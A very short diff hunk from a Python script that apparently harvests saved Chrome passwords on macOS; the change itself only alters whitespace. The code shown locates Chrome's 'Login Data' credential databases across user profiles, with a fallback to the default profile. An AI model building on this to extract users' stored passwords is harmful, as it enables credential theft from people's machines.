@@ -1,5 +1,5 @@
 import sqlite3, os, binascii, subprocess, base64, sys, hashlib, glob
-
+ 
 loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Profile*/Login Data" % os.path.expanduser("~"))
 if len(loginData) == 0:
     loginData = glob.glob("%s/Library/Application Support/Google/Chrome/Default/Login Data" % os.path.expanduser("~")) #attempt default profile
